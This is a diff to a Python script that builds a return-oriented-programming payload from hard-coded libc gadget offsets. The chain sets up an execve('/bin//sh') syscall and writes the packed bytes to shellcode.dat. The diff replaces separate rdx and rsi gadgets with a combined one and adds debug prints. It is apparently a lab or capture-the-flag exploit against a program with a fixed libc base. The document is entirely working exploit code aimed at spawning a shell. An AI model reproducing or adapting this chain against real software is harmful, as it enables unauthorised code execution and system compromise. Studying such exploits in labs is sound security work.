@@ -8,12 +8,15 @@ import binascii
 LIBC_OFFSET = 0x7ffff7a3a000
 g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
 d1 = 59
-g2 = LIBC_OFFSET + 0x18ac7c + 0x2c #  pop rdx
+# g2 = LIBC_OFFSET + 0x18ac7c + 0x2c #  pop rdx
+# d2 = 0
+# d3 = 0
+# g3 = LIBC_OFFSET + 0x7a799 + 0xc # rsi +r15
+# d4 = 0
+# d5 = 0
+g2 = LIBC_OFFSET + 0xf54f9 #pop rdx + rsi
 d2 = 0
 d3 = 0
-g3 = LIBC_OFFSET + 0x7a799 + 0xc # rsi +r15
-d4 = 0
-d5 = 0
 g4 = LIBC_OFFSET + 0x1fc6a  #= pop rdi
 d6 = 0x68732f2f6e69622f #/bin//sh
 d7 = 0
@@ -28,10 +31,10 @@ shellcode += struct.pack('<q', g1)
 shellcode += struct.pack('<q', d1)
 shellcode += struct.pack('<q', g2)
 shellcode += struct.pack('<q', d2)
-shellcode += struct.pack('<q', d3)
-shellcode += struct.pack('<q', g3)
-shellcode += struct.pack('<q', d4)
-shellcode += struct.pack('<q', d5)
+# shellcode += struct.pack('<q', d3)
+# shellcode += struct.pack('<q', g3)
+# shellcode += struct.pack('<q', d4)
+# shellcode += struct.pack('<q', d5)
 shellcode += struct.pack('<q', g4)
 shellcode += struct.pack('<q', d6)
 shellcode += struct.pack('<q', d7)
@@ -43,3 +46,15 @@ with open("shellcode.dat", "wb") as f:
     f.write(shellcode)
 print (binascii.hexlify(shellcode))
 print ("g1: %x" % (g1))
+print ("d1: %x" % (d1))
+print ("g2: %x" % (g2))
+print ("d2: %x" % (d2))
+# print ("d3: %x" % (d3))
+# print ("g3: %x" % (g3)) #bug here
+# print ("d4: %x" % (d4))
+# print ("d5: %x" % (d5))
+print ("g4: %x" % (g4))
+print ("d6: %x" % (d6))
+print ("d7: %x" % (d7))
+print ("g5: %x" % (g5))
+print ("g6: %x" % (g6))
